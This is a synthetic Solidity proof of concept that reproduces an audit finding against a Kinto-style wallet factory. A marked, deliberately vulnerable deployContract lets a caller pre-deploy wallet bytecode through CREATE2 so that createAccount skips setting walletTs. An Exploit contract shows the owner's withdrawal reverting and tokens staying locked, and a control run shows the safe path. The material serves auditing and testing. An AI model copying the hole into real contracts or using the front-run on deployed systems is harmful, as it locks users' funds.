// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Kinto — deployContract front-runs createAccount and leaves walletTs at 0
    (MixBytes, finding 30496)
    SYNTHETIC, cheatcode-free. A KYC'd caller CREATE2s the wallet bytecode.
    createAccount then finds code already there and returns without setting
    walletTs. The owner's later withdraw reverts and N tokens stay in the wallet.
    The control creates the account first. walletTs is set and the withdraw pays N. */

contract Asset {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Factory {
    Asset public token;
    mapping(address => uint256) public walletTs;

    constructor(Asset token_) {
        token = token_;
    }

    function isKYC(address) public pure returns (bool) {
        return true;
    }

    function walletInitCode(address owner_) public view returns (bytes memory) {
        return abi.encodePacked(type(Wallet).creationCode, abi.encode(owner_, token, address(this)));
    }

    function getAddress(address owner_, uint256 salt) public view returns (address) {
        bytes32 hash = keccak256(walletInitCode(owner_));
        return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), bytes32(salt), hash)))));
    }

    function getWalletTimestamp(address wallet) external view returns (uint256) {
        return walletTs[wallet];
    }

    function deployContract(uint256 amount, bytes memory bytecode, bytes32 salt) external returns (address deployed) {
        require(isKYC(msg.sender), "KYC required");
        require(amount == 0, "amount");
        // @> VULN: CREATE2 may be a KintoWallet and walletTs is never written
        deployed = _create2(salt, bytecode);
    }

    function createAccount(address owner_, uint256 salt) external returns (address ret) {
        require(isKYC(owner_), "KYC required");
        ret = getAddress(owner_, salt);
        if (ret.code.length > 0) {
            return ret;
        }
        ret = _create2(bytes32(salt), walletInitCode(owner_));
        walletTs[ret] = block.timestamp;
    }

    function _create2(bytes32 salt, bytes memory bytecode) internal returns (address addr) {
        assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
        }
        require(addr != address(0), "create2");
    }
}

contract Wallet {
    address public owner;
    Asset public token;
    Factory public factory;

    constructor(address owner_, Asset token_, Factory factory_) {
        owner = owner_;
        token = token_;
        factory = factory_;
    }

    function withdraw(uint256 amount) external {
        require(msg.sender == owner, "owner");
        require(factory.getWalletTimestamp(address(this)) != 0, "unknown wallet");
        require(token.transfer(owner, amount), "pay");
    }
}

contract Owner {
    function tryWithdraw(Wallet wallet, uint256 amount) external returns (bool ok) {
        (ok,) = address(wallet).call(abi.encodeWithSignature("withdraw(uint256)", amount));
    }
}

contract Exploit {
    uint256 public constant N = 1_000 ether;
    uint256 public constant SALT = 7;

    Asset public token;
    Factory public factory;
    Owner public owner;
    address public walletAddr;
    uint256 public timestamp;
    bool public withdrew;
    uint256 public stuck;
    bool public controlWithdrew;
    uint256 public controlBalance;

    constructor() {
        token = new Asset();
        owner = new Owner();
        factory = new Factory(token);
    }

    function run() external {
        bytes memory initCode = factory.walletInitCode(address(owner));
        walletAddr = factory.deployContract(0, initCode, bytes32(SALT));
        address created = factory.createAccount(address(owner), SALT);
        timestamp = factory.getWalletTimestamp(walletAddr);
        token.mint(walletAddr, N);
        withdrew = owner.tryWithdraw(Wallet(payable(walletAddr)), N);
        stuck = token.balanceOf(walletAddr);
        require(created == walletAddr, "same");
        require(timestamp == 0, "ts");
        require(withdrew == false, "withdrew");
        require(stuck == N, "stuck");
    }

    function runControl() external {
        address clean = factory.createAccount(address(owner), SALT);
        require(factory.getWalletTimestamp(clean) != 0, "ts");
        token.mint(clean, N);
        controlWithdrew = owner.tryWithdraw(Wallet(payable(clean)), N);
        controlBalance = token.balanceOf(address(owner));
        require(controlWithdrew == true, "paid");
        require(controlBalance == N, "owner");
        require(token.balanceOf(clean) == 0, "empty");
    }
}
